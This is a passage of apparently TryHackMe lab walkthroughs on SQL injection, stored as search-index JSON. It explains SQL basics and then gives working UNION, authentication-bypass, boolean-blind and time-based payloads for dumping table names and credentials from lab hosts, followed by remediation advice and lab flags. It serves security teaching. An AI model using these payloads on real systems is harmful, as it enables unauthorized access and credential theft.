of records retrieved by our query. This can be accomplished using <code>LIMIT x</code> to force the database to return only the specified number (<code>x</code>) of records. For example LIMIT 1 tells the database to return only one row of data.</p> <p>Similarly, we can tell the database to skip a record by using <code>LIMIT x,y</code> where <code>x</code> denotes the number of records to skip and <code>y</code> denotes the number of records to retrieve.</p> <p>Take for example the following statement used with the users table presented above.</p> <p><pre><code>SELECT * FROM users LIMIT 1,2;\n</code></pre> </p> username password joe p4ssw0rd jane qwerty <p></p> <p>In the event where a specific record needs to be retrieved, the <code>WHERE</code> clause can be used. The following statement used with the users table presented above would return the specific record as requested by the statement.</p> <p><pre><code>SELECT * FROM users WHERE username = 'joe';\n</code></pre> </p> username password joe p4ssw0rd <p></p> <p>Alternatively, we can tell the database to retrieve all records except for the specified record using the following statement.</p> <p><pre><code>SELECT * FROM users WHERE username != 'joe';\n</code></pre> </p> username password admin password123 jane qwerty <p></p> <p>Similarly, conditional clauses like <code>OR</code> and <code>AND</code> can used to craft more complex statements based on dataset retrieval requirements.</p> <p>Take for example the following statement where only records associated with admin or joe will be retrieved.</p> <p><pre><code>SELECT * FROM users WHERE username = 'admin' OR username = 'joe';\n</code></pre> </p> username password admin password123 joe p4ssw0rd <p></p> <p>Or the following statement where the record will only be retrieved when username is equal to admin and the password is equal to password123.</p> <p><pre><code>SELECT * FROM users WHERE username = 'admin' AND password = 'password123';\n</code></pre> </p> username password admin password123 <p></p> <p>The <code>LIKE</code> clause can be used to specify data which isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character <code>%</code>.</p> <p>The following statement returns any row with the username beginning with the letter a.</p> <p><pre><code>SELECT * FROM users WHERE username LIKE 'a%';\n</code></pre> </p> username password admin password123 <p></p> <p>The following statement will return any record with the username ending with the letter e.</p> <p><pre><code>SELECT * FROM users WHERE username LIKE '%e';\n</code></pre> </p> username password joe p4ssw0rd jane qwerty <p></p> <p>The following statement will return any record where the username contains the letters a and n in the specified order.</p> <p><pre><code>SELECT * FROM users WHERE username LIKE '%an%';\n</code></pre> </p> username password jane qwerty <p></p>"},{"location":"walkthroughs/thm/sqlinjection/#union","title":"UNION","text":"<p>The <code>UNION</code> statement is used to combine the results of two or more <code>SELECT</code> statements. The UNION statement must retrieve the same number of columns in each SELECT statement. The retrieved columns must have similar data type and column order.</p> <p>Consider the following tables named customers and vendors.</p> id name address city postal 1 Jo Shepard 123 53 Street Edmonton T1J 4M3 2 Jane Smith 59 Pulsar Street Calgary R2Y 4J1 3 Paul Rogers 45 Red Street Edmonton T6M 2J5 <p></p> id company address city postal 1 ACME Co. 52 Gray Avenue Toronto Y1T 4B1 2 Nova Inc. 125 Stellar Crescent Vancouver Y2Z 2J3 3 Brown Consulting 143 Homeward Ave Edmonton T6J 1J5 <p></p> <p>By utilizing the UNION statement, we can combine results from the two tables above and put them into a single dataset.</p> <p><pre><code>SELECT name,address,city,postal FROM customers UNION SELECT company,address,city,postal FROM vendors;\n</code></pre> </p> name address city postal Jo Shepard 123 53 Street Edmonton T1J 4M3 Jane Smith 59 Pulsar Street Calgary R2Y 4J1 Paul Rogers 45 Red Street Edmonton T6M 2J5 ACME Co. 52 Gray Avenue Toronto Y1T 4B1 Nova Inc. 125 Stellar Crescent Vancouver Y2Z 2J3 Brown Consulting 143 Homeward Ave Edmonton T6J 1J5 <p></p>"},{"location":"walkthroughs/thm/sqlinjection/#insert","title":"INSERT","text":"<p>The <code>INSERT</code> statement is used to tell the database that we would like to add a new record into the table.</p> <p>Consider the users table presented earlier.</p> <p><pre><code>INSERT INTO users (username,password) VALUES ('bob','pass');\n</code></pre> The clause <code>INTO users</code> tells the database which table we wish to insert the new record into. <code>(username,password)</code> provides the column names we are providing the data for and <code>VALUES ('bob','pass')</code> provides the data for the specified columns.</p> id username password 1 admin password123 2 joe p4ssw0rd 3 jane qwerty 4 bob pass <p></p>"},{"location":"walkthroughs/thm/sqlinjection/#update","title":"UPDATE","text":"<p>The <code>UPDATE</code> statement allows us to update one or more record within a table.</p> <p>Consider the statement below. </p> <p><pre><code>UPDATE users SET username='root',password='pass123' WHERE username='admin';\n</code></pre> <code>UPDATE users</code> tells the database that we would like to update a record in the users table. <code>SET username='root',password='pass123'</code> tells the the database which field needs to be updated and their associated values. <code>WHERE username='admin'</code> specifies the exact row to be updated. The dataset returned would be as follows.</p> id username password 1 root pass123 2 joe p4ssw0rd 3 jane qwerty 4 bob pass <p></p> <p>Note that the username and password fields for admin have been updated respectively.</p>"},{"location":"walkthroughs/thm/sqlinjection/#delete","title":"DELETE","text":"<p>The <code>DELETE</code> statement allows us to remove specific records for a specified table. <code>LIMIT x</code> can be used to specify the number of rows to be deleted.</p> <p>Consider the following statement.</p> <p><pre><code>DELETE FROM users WHERE username='jane';\n</code></pre> </p> id username password 1 root pass123 2 joe p4ssw0rd 4 bob pass <p></p> <p>Note that all data from a table can be expunged by omitting the <code>WHERE</code> clause.</p> <p><pre><code>DELETE FROM users;\n</code></pre> </p> id username password"},{"location":"walkthroughs/thm/sqlinjection/#sql-injection","title":"SQL Injection","text":"<p>SQLi is a major yet common attack on web applications which occurs when the application accepts a malicious user input and uses it as part of the SQL statement to query the database.</p> <p>Consider the following example URL: <code>https://www.example.com/blog?id=1</code></p> <p>Let's assume that the above URL serves blog posts to the user where each blog entry has a unique id number. The blog entries may be marked as public or private to control access. In the URL above, the blog entry is selected using the id parameter. The web application uses the id parameter in an SQL statement to retrieve the requested entry from the database. An example of the SQL statement may resemble the following.</p> <p><pre><code>SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;\n</code></pre> Here we are requesting the database to retrieve an entry with id equal to 1 and the private parameter set to 0 from the blog database. The retrieved records are limited to a single match by using the LIMIT 1 clause.</p> <p>Let's assume that blog entry with id equal to 2 is locked as private and cannot be accessed by us. If our inputs are not properly sanitized, we can modify and call the URL: <code>https://www.example.com/blog?id=2;--</code></p> <p>The vulnerable web application would take the above URL and produce the following SQL statement.</p> <p><pre><code>SELECT * FROM blog WHERE id=2;-- and private=0 LIMIT 1;\n</code></pre> The semicolon after <code>id=2</code> signifies the end of the SQL statement and the two <code>--</code> causes everything afterwards to be treated as a comment in MySQL. The database in turn executes the above statement as follows.</p> <p><pre><code>SELECT * FROM blog WHERE id=2;\n</code></pre> This retrieves the blog entry with an id equal 2 which normally we would not be able to see due to it being marked as private.</p> <p>The above is a very simple example of basic SQLi vulnerability of a type called In-Band SQL Injection. We will explore this further in the next section.</p>"},{"location":"walkthroughs/thm/sqlinjection/#in-band-sqli","title":"In-Band SQLi","text":"<p>In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and retrieve the results. In-Band SQL injections are considered to be the most common and the easiest type of SQLi to detect and exploit.</p> <p>The two most common types of in-band SQLi are <code>Error-Based SQLi</code> and <code>Union-Based SQLi</code>.</p> <ul> <li> <p>Error-based SQLi rely on error messages created by the database server to obtain information about the structure of the database. This type of SQLi can often be used by an attacker to enumerate an entire database.</p> </li> <li> <p>Union-based SQLi leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response. This method is the most common way to extract large amounts of data via an SQLi vulnerability.</p> </li> </ul> <p>Let's look at a practical example of in-band UNION based SQLi attack using MySQL.</p> <p>The key to discovering error-based SQLi is to break the underlying SQL query by trying certain characters until an error message is produced (typically this is most commonly done using single apostrophe <code>'</code> or a quotation mark <code>\"</code>).</p> <p>Let's place an <code>'</code> after the <code>id=1</code> in the URL. Notice the error message. This indicates that the web application is vulnerable to SQLi (particularly error-based SQLi).</p> <p></p> <p>Now that we know that the web application is vulnerable to SQLi, we need to return data to the browser without displaying an error message. By utilizing the UNION operator we can retrieve additional results. Recall that when using UNION, the retrieved dataset must have the same number of columns as the preceding SELECT statement.</p> <p>Let's try <code>1 UNION SELECT 1</code> (alternatively we could use <code>1 UNION SELECT null</code> which will yield the same result). Notice that the error message returned indicates that there is a mismatch in the number of columns.</p> <p></p> <p>Let's keep adding columns until the error message disappears.</p> <p>At <code>1 UNION SELECT 1,2,3</code> (or <code>1 UNION SELECT null,null,null</code>) the error message disappears and the article is once again displayed. The reason the article is displayed is because the query takes the first returned result in the web application's code and displays it. We can get around this by setting the original SELECT operator to produce no result by changing the article id to either <code>0</code> or <code>-1</code>.</p> <p></p> <p></p> <p>We can now dump the list of tables in the active database. We can achieve this by leveraging the fact that we know the database type is MySQL and as such use <code>information_schema</code> which contains information on all the databases and tables.</p> <p>This can be accomplished using: <code>-1 UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()</code></p> <p>In the statement above:  - <code>group_concat(table_name)</code> tells the database that we want to retrieve the specific column named <code>table_name</code> from the multiple returned rows and put it into one string separated by commas.   - <code>information_schema.tables</code> tells the database that we are interested in all the tables in the database we have access to.  - <code>table_schema = database()</code> indicates which database we would like to retrieve the table names from. In MySQL, <code>database()</code> retrieves the name of the active (or current) database.</p> <p></p> <p>Now that we know the table names in the database, we can proceed with dumping the columns for a specific table. As the purpose of this exercise is to retrieve the password for user <code>martin</code>, we can start with the table <code>staff_users</code>.</p> <p>To dump the columns in a table, we can use: <code>-1 UNION SELECT null,null,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</code></p> <p>In the statement above: - <code>group_concat(column_name)</code> tells the database that we want to retrieve the <code>column_name</code> from the multiple returned rows and put it into one string separated by commas. - <code>information_schema.columns</code> contains information on the columns within the tables the user has access to. - <code>table_schema = 'staff_users'</code>  indicates that we wish to retrieve column names for the <code>staff_users</code> table.</p> <p></p> <p>Now that we know what columns are present in the <code>staff_users</code> we can retrieve the user's information using <code>-1 UNION SELECT null,null,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users</code>.</p> <p>In the statement above, <code>group_concat</code> method returns all the rows into one string to make it easier to read. The <code>':'</code> is used to split username and password from each other. The HTML tag <code>&lt;br&gt;</code> is used to display each result on a separate line instead of being comma separated.</p> <p></p> <p>We can now confirm martin's password to retrieve the flag: <code>THM{SQL_INJECTION_3840}</code></p> <p>Let's summarize the steps above into something more general.</p> <ol> <li>Verify SQLi vulnerability via entry point detection by escaping the current context.    <pre><code> [Nothing]\n '\n \"\n `\n ')\n \")\n `)\n '))\n \"))\n `))\n</code></pre></li> <li>Determine the number of columns in the table by using <code>Order/Group by</code> or <code>UNION SELECT</code> (continue to increment or add additional <code>null</code> values until the query is correct).    <pre><code>' ORDER BY 1--    \n' ORDER BY 2--    \n' ORDER BY 3--    \n' ORDER BY 4--    #Error: The ORDER BY position number 3 is out of range of the number of items in the select list.\n</code></pre>    OR</li> </ol> <p><pre><code>' UNION SELECT null--           #Error: All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.\n' UNION SELECT null,null--      #Error: All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.\n' UNION SELECT null,null,null-- #Working\n</code></pre> 3. Verify column data type to allow retrieval of the results from an injected query. If the data type of a column is not compatible with string data, the injected query will cause a database error.    <pre><code>' UNION SELECT 'a',null,null--   #Error: Conversion failed when converting the varchar value 'a' to data type int.\n' UNION SELECT null,'a',null--   #Error: Conversion failed when converting the varchar value 'a' to data type int.\n' UNION SELECT null,null,'a'--   #Working\n</code></pre> 4. Extract database names, table names, column names and data.    <pre><code># Database Names\n' UNION SELECT null,null,group_concat(schema_name) FROM information_schema.schemata\n\n# Database Name Alternative for Current/Active Database\n' UNION SELECT null,null,database()\n\n# Table Names\n' UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'SPECIFY_DATABASE_NAME'\n\n# Table Names Alternative for Current/Active Database\n' UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()\n\n# Column Names\n' UNION SELECT null,null,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'SPECIFY_TABLE_NAME'\n\n# Retrieve Data\n' UNION SELECT null,null,group_concat(SPECIFY_COLUMN_NAME,SPECIFY_COLUMN_NAME) FROM SPECIFY_TABLE_NAME\n</code></pre></p>"},{"location":"walkthroughs/thm/sqlinjection/#blind-sqli","title":"Blind SQLi","text":"<p>Like in-band SQLi,  blind SQL injection (also known as Inferential SQL Injection) arises when a web application is vulnerable to SQLi but the HTTP responses do not contain results of the relevant SQL query or the details of any database error. Blind SQLi requires the attacker to reconstruct the database structure step-by-step by observing the behaviour of the database server and web application. SQL injection techniques like UNION attacks are not as effective in blind SQLi due their reliance on being able to see the results of the injected query but still possible though time consuming.</p> <p>There are two variants of blind SQL injection that are commonly used: <code>Content-based Blind SQL Injection</code> and <code>Time-based SQL Injection</code>.</p> <p>One of the most common and straightforward applications of blind SQL injection technique is bypassing authentication. </p>"},{"location":"walkthroughs/thm/sqlinjection/#authentication-bypass","title":"Authentication Bypass","text":"<p>In authentication bypass attacks, an attacker is less concerned with retrieving data from the database which makes blind SQLi less complex and time consuming.</p> <p>Often web applications with login forms and their underlying databases are developed in a way that isn't interested in the content of the username and password fields but whether the two fields make a matching pair in a specific table. An authentication bypass attack relies on this behaviour to create a database query that replies with a TRUE or FALSE thereby making valid username/password pair enumeration unnecessary.</p> <p>Let's look at a practical example of an authentication bypass attack.</p> <p>The following example web application requires a correct username and password values in order to authenticate the user. </p> <p></p> <p>In the back end, the web application code produces the following SQL query based on a user's input:</p> <p><pre><code>SELECT * FROM users WHERE username = '%username%' and password = '%password%' LIMIT 1;\n</code></pre> The above query returns a TRUE when a matching pair for username and password are found and FALSE when a matching pair is not found. Note that the <code>'%username%'</code> and <code>'%password%'</code> values are taken from the login form fields and as result the initial values in the SQL query above will be blank as these fields are empty by default.</p> <p>In order to make the SQL query above always return a TRUE, we can modify the username or password field with the following conditional (boolean) operator which is always true.</p> <p><pre><code>' OR 1=1;--\n</code></pre> The <code>OR</code> operator in combination with the always true statement <code>1=1</code> ensures that the query always returns as a TRUE which satisfies the logic condition that the database found a valid username/password pair and that access should be granted. <code>--</code> truncates any proceeding statement from being executed by converting it into a comment. As a result, the original query gets modified to:</p> <p><pre><code>SELECT * FROM users WHERE username = '' OR 1=1;    -- If injected into username field\n</code></pre> OR</p> <p><pre><code>SELECT * FROM users WHERE username = '' AND password = '' OR 1=1;    -- If injected into password field\n</code></pre> </p> <p></p> <p>By using this modified SQL query, we are able to bypass any user authentication requirements and acquire the flag: <code>THM{SQL_INJECTION_9581}</code></p>"},{"location":"walkthroughs/thm/sqlinjection/#content-based-blind-sql-injection","title":"Content-based Blind SQL Injection","text":"<p>Content-based Blind SQLi (also referred to as Boolean-based Blind SQLi) requires the attacker to observe the behaviour of the database server after making SQL queries containing boolean operators that ask the database <code>TRUE</code> and <code>FALSE</code> statements.</p> <p>Consider the following example where a URL, <code>http://example.com/items.php?id=1</code>, sends the following query to the database:</p> <p><pre><code>SELECT * FROM items WHERE id = 1;\n</code></pre> An attacker may manipulate the request and try to inject a query that returns a FALSE:</p> <p><pre><code>http://example.com/items.php?id=1 and 1=2\n</code></pre> As a result, the SQL query changes to:</p> <p><pre><code>SELECT * FROM items WHERE id = 1 AND 1=2;\n</code></pre> The above SQL query will return a FALSE. If the web application is susceptible to SQLi, then it most likely will not return anything. To verify vulnerability, the attacker should inject a query that will return a TRUE.</p> <p><pre><code>http://example.com/items.php?id=1 and 1=1\n</code></pre> If the contents of the web application injected with a query that returns TRUE are different than those of a query that returns FALSE, it is susceptible to content-based SQLi. Using this knowledge, it is possible to enumerate a whole database structure and its content.</p> <p>Let's look at a more practical example of how an attacker can leverage content-based blind SQLi to retrieve database structure and eventually a password for a specific user. As we will see with the following example, this method of SQL injection can be extremely time consuming based on the complexity of the database.</p> <p>The following example web application presents a mock browser with the following URL:</p> <p><pre><code>https://website.thm/checkuser?username=admin\n</code></pre> The underlying SQL query is as follows:</p> <p><pre><code>SELECT * FROM users WHERE username = '%username%' LIMIT 1;\n</code></pre> </p> <p></p> <p>The browser body shows the contents of <code>{\"taken\":true}</code> which replicates a common feature found in many sign-up forms that check whether a username already exists during registration and prompt the user to choose a different username.</p> <p>As we can see in the image above, the value for <code>taken</code> is set to <code>true</code> which implies that the username <code>admin</code> is already registered. Let's select a username that does not exist in the database (<code>test</code>) which give us a <code>taken</code> value of <code>false</code> and manipulate the the query such that it changes the value of <code>taken</code> to <code>true</code> in order to verify content-based SQLi vulnerability.</p> <p><pre><code>https://website.thm/checkuser?username=test' OR 1=1;--\n</code></pre> </p> <p></p> <p>Notice that the even though <code>test</code> does not exist as a user and as such should give us a <code>taken</code> value of <code>false</code>, the addition of <code>OR 1=1;--</code> results in the query being always true.</p> <p>We can now begin enumerating the database structure using the UNION attack technique. Let's start by enumerating the number of columns in the table.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null;--\n</code></pre> </p> <p></p> <p>Let's keep adding <code>null</code> to the statement until the number of columns match.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null;--\n</code></pre> </p> <p></p> <p>With the number of columns known, we can begin enumerating the name of the database. This can be accomplished by using the built-in <code>database()</code> method in MySQL and then using the LIKE operator to try and find results that will return a <code>true</code> value for <code>taken</code>.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null WHERE database() LIKE 'a%';--\n</code></pre> </p> <p></p> <p>Based on the statement above, we can be confident that the name of the database does not start with the letter 'a'. Continue cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null WHERE database() LIKE 's%';--\n</code></pre> </p> <p></p> <p>Based on the result above, we can be confident that the first letter of the database's name is the letter 's'. We can now move onto the next character in the database name (ie. 'sa%', 'sb%, 'sc%', etc.) and continue the iteration process until all the characters of the database name have been discovered (<code>sqli_three</code>).</p> <p>Once we have established the database name, we can begin enumerating the table names using a similar method utilizing the <code>information_schema</code> database.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--\n</code></pre> Cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>. Going through the iterative process, we will discover a table in the <code>sqli_three</code> database named <code>users</code>.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name LIKE 'users';--\n</code></pre> </p> <p></p> <p>With the table name now known, we can begin enumerating the columns in the <code>users</code> table. Here we will leverage the <code>information_schema.columns</code> method, database name and table name for enumeration.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null FROM information_schema.columns WHERE table_schema = 'sqli_three' AND table_name = 'users' AND column_name like 'a%';--\n</code></pre> Cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>. As tables have multiple columns, we need to ensure that we add any found column names to our query to avoid re-discovering the same one again. As we iterate through, we will discover one of the column names <code>id</code> which we will need to add to our query.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null FROM information_schema.columns WHERE table_schema = 'sqli_three' AND table_name = 'users' AND column_name like 'a%' AND column_name != 'id';--\n</code></pre> Repeating the iteration process, we will discover three columns in the <code>users</code> table: <code>id</code>, <code>username</code> and <code>password</code>. With this knowledge we can start enumerating the password for a known user. Since we know that <code>admin</code> is a valid user, we can modify our query to begin the password discover.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null FROM users WHERE username = 'admin' and password LIKE 'a%';--\n</code></pre> Cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>. Repeating the iteration process we will discover the password <code>3845</code> for the <code>admin</code> user.</p> <p><pre><code>https://website.thm/checkuser?username=test' UNION SELECT null,null,null FROM users WHERE username = 'admin' and password LIKE '3845';--\n</code></pre> </p> <p></p> <p>Using the credentials <code>admin:3845</code> we can retrieve the flag: <code>THM{SQL_INJECTION_1093}</code></p> <p>As obvious for this example, content-based blind SQLi can be a time consuming endeavour but none-the-less allow an attacker to retrieve unauthorized data.</p>"},{"location":"walkthroughs/thm/sqlinjection/#time-based-blind-sqli-injection","title":"Time-based Blind SQLi Injection","text":"<p>Time-based blind SQLi injections requires an attacker to observe the behaviour of a web application and its underlying database server after forcing the database to perform a time-intensive operation. If the web application does not return a response immediately, blind SQLi vulnerability is likely. This is useful for scenarios where no visual indicator of queries being TRUE or FALSE are presented.</p> <p>In MySQL, the built-in method SLEEP(x) alongside with UNION SELECT are typically leveraged.</p> <p>Let's look at a practical example of time-based blind SQLi.</p> <p>Begin by enumerating the number of columns in the table. We can do this by combining UNION SELECT with SLEEP(5). If the number of columns guessed is correct, we should observe a 5 second delay in the response time. If there was no pause in the response time then it is likely that the query was unsuccessful. Like in the previous example, we select a username (referrer) which does not exist in the database.</p> <p><pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5);--\n</code></pre> </p> <p></p> <p>Notice that the above query does not cause any time delay in the response time which indicates that our UNION SELECT statement did not execute due to an error (in this case a mismatch of columns between the SELECT statements). Let's continue enumerating the number of columns by incrementing the number of columns.</p> <p><pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null;--\n</code></pre> </p> <p></p> <p>Notice the delay of 5 seconds in the response time. This means that our UNION SELECT query executed successfully and that there are 2 columns.</p> <p>Based on this behaviour, we can follow the iterative process we used in the content-based blind SQLi attack to determine the database name, table name, column names and the credentials.</p> <p>Enumerate the database name <code>sqli_four</code> by:</p> <pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null WHERE database() LIKE 'sqli_four';--\n</code></pre> <p>Enumerate the table name <code>users</code> by:</p> <pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null FROM information_schema.tables WHERE table_schema = 'sqli_four' AND table_name LIKE 'users';--\n</code></pre> <p>Enumerate column names <code>username</code> and <code>password</code> by:</p> <p><pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null FROM information_schema.columns WHERE table_schema = 'sqli_four' AND table_name = 'users' AND column_name LIKE 'username';--\n</code></pre> </p> <pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null FROM information_schema.columns WHERE table_schema = 'sqli_four' AND table_name = 'users' AND column_name LIKE 'password' AND column_name != 'username';--\n</code></pre> <p>Enumerate username <code>admin</code> by:</p> <pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null FROM users WHERE username LIKE 'admin';--\n</code></pre> <p>Enumerate password <code>4961</code> by:</p> <p><pre><code>https://website.thm/analytics?referrer=test' UNION SELECT SLEEP(5),null FROM users WHERE username = 'admin' AND password LIKE '4961%';--\n</code></pre> Logging in with the credentials <code>admin:4961</code> we acquire the flag: <code>THM{SQL_INJECTION_MASTER}</code></p>"},{"location":"walkthroughs/thm/sqlinjection/#out-of-band-sqli","title":"Out-of-Band SQLi","text":"<p>Out-of-band SQLi is a type of SQL injection where the attacker does not receive a response from the attacked web application on the same communication channel but instead is able to cause the application to send data to a remote endpoint. An out-of-band attack is classified by having two communication channels: one to launch the attack and one to gather the results.</p> <p>The general process of out-of-band SQLi follows these steps: 1. An attacker makes a request to a web application vulnerable to SQL injection with an injection payload. 2. The web application makes an SQL query to the database which also passes along the attacker's payload to the SQL server. 3. The payload contains a request which forces an HTTP (or DNS) request back to the attackers machine containing data from the database.</p> <p>Out-of-band SQLi are not considered to be common in practice.</p>"},{"location":"walkthroughs/thm/sqlinjection/#sqli-remediation","title":"SQLi Remediation","text":"<p>The following are some common remediation actions which can be put in place as remediation measures against SQLi:</p> <ol> <li> <p>Prepared Statements (with Parameterized Queries) - In a prepared statement, the developer writes an SQL query first and then adds any user inputs as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data.</p> </li> <li> <p>Input Validation - Syntactic validation of user input can significantly help in mitigating SQLi. Employing an allow (white) list can restrict input to only certain characters or strings. String replacement method in the various programming languages can filter the characters a developer wishes to allow or disallow.</p> </li> <li> <p>Escaping User Input - Allowing user inputs to contain characters such as <code>' \" $ \\</code> can cause SQL queries to break and even lead to injection attacks. Escaping user input is a method of prepending a backslash (<code>\\</code>) to these characters which causes them to be parsed just as a regular string and not as a special character in an SQL query.</p> </li> </ol> <p>Additional information on SQL injection prevention can be found at SQL Injection Prevention Cheat Sheet.</p>"},{"location":"walkthroughs/thm/sqlinjectionlab/","title":"SQL Injection Lab","text":""},{"location":"walkthroughs/thm/sqlinjectionlab/#resources","title":"Resources","text":"<p>Following a list of useful resources and cheat sheets related to SQL Injection.</p> <ul> <li>PortSwigger - SQL Injection Cheat Sheet</li> <li>Payload All the Things - SQL Injection</li> <li>Websec - SQL Injection</li> <li>HackTricks - SQL Injection</li> <li>OWASP - SQL Injection Prevention</li> </ul>"},{"location":"walkthroughs/thm/sqlinjectionlab/#introduction-to-sql-injection","title":"Introduction to SQL Injection","text":"<p>This room provides and introduction to SQL injection and demonstrates various SQL Injection attacks.</p> <p>SQL injection is a technique through which attackers can execute their own malicious SQL statements thereby allowing changes to the backend database or worse theft of personal identifiable information and credentials.</p> <p>Web applications typically need dynamic SQL queries in order to display content to an end-user. In order to allow dynamic SQL queries, web developers often concatenate user inputs directly into SQL statements. Without sufficient input validation or use of secure coding practices, string concatenation becomes the most common mistake that leads to SQL injection vulnerability.</p> <p>Take for example the following PHP code which demonstrates a dynamic SQL query in a login form:</p> <p><pre><code>$query = \"SELECT * FROM users WHERE username='\" + $_POST[\"user\"] + \"' AND password='\" + $_POST[\"password\"]$ + '\";\"\n</code></pre> In the above example code, providing the value <code>' OR 1=1-- -</code> inside the username parameter can force the database to execute the SQL statement and return all the users in the users table. In essence, the attacker is able to bypass the application's authentication mechanism and is logged in as the first user returned by the query. This is because the addition of the <code>' OR 1=1--</code> in the name parameter results in the the following SQL query:</p> <p><pre><code>SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''\n</code></pre> The reason for using <code>-- -</code> instead of <code>--</code> is primarily because MySQL's double-dash comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, etc.).</p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#sql-injection-1-input-box-non-string","title":"SQL Injection 1: Input Box Non-String","text":"<p>When logging in, the application performs the following query:</p> <p><pre><code>SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'\n</code></pre> For this challenge, the application accepts user supplied input for profileID as an integer (ie. <code>profileID=10</code>). Since inputs by the user are not being sanitized, we can bypass any authentication attempts by injecting a modified query into the profileID field which always returns a TRUE condition (ie. <code>1 OR 1=1-- -</code>). The password can be any random string.</p> <p></p> <p></p> <p>Injecting the malicious payload above allows us to bypass any authentication measures presented by the web application and log in as the first result returned.</p> <p></p> <p></p> <p>Notice the resultant SQL query. Everything after the <code>1 OR 1=1-- -</code> statement is converted into a comment and thereby ignored by the database server when executing the query.</p> <p><pre><code>SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 OR 1=1-- - AND password = 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'\n</code></pre> Retried Flag: <code>THM{dccea429d73d4a6b4f117ac64724f460}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#sql-injection-2-input-box-string","title":"SQL Injection 2: Input Box String","text":"<p>This challenge uses the same query as in the previous challenge however the parameter expects a string instead of an integer (ie. `profileID='10').</p> <p>Since the query expects a string, we can modify our payload as follows to bypass the authentication mechanism. Again, the password field can be a random value.</p> <p><pre><code>1' OR 1=1-- -\n</code></pre> </p> <p>The executed SQL query is as follows. Notice how everything after the <code>1' OR 1=1-- -'</code> statement is converted into a comment and thereby ignored by the SQL server during query execution. Since the password check is not executed due to the modified query, our payload allows us to bypass the authentication check which is normally performed by the backend server.</p> <p><pre><code>SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' OR 1=1-- -' AND password = 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'\n</code></pre> </p> <p></p> <p></p> <p>Retrieved Flag: <code>THM{356e9de6016b9ac34e02df99a5f755ba}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#sql-injection-3-url-injection","title":"SQL Injection 3: URL Injection","text":"<p>This challenge implements client-side controls to prevent malicious user inputs from being injected directly into the application via the login form. The JavaScript code below requires both the profileID and the password fields to only contain characters between a-z, A-Z and 0-9. </p> <p><pre><code>function validateform() {\n    var profileID = document.inputForm.profileID.value;\n    var password = document.inputForm.password.value;\n\n    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {\n        alert(\"The input fields cannot contain special characters\");\n        return false;\n    }\n    if (profileID == null || password == null) {\n        alert(\"The input fields cannot be empty.\");\n        return false;\n    }\n}\n</code></pre> Note that client-side controls are only there to improve the user experience and should not be used as a security feature as the user has full control over the client and data it submits.</p> <p>Notice how we get an error message when we try to inject a special character into the login form.</p> <p></p> <p>Since we can't inject special characters, let's try a random profileID and password to see if we can find another vector. Trying inputs <code>test:test</code> results in a message indicating that the account information provided does not exist. However, it looks like the web application is making a GET request to the database server which contains the profileID and password in the URL field.</p> <p></p> <p>Let's inject our malicious query into the URL.</p> <p><pre><code>http://10.10.158.53:5000/sesqli3/login?profileID=test' OR 1=1-- -&amp;password=test\n</code></pre> The resultant executed query is as follows:</p> <p><pre><code>SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='test' OR 1=1-- -' AND password='9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'\n</code></pre> Notice once again how everything after the <code>' OR 1=1-- -</code> statement is converted into a comment and thereby the password validation is never executed thus allowing us to bypass the authentication check completely.</p> 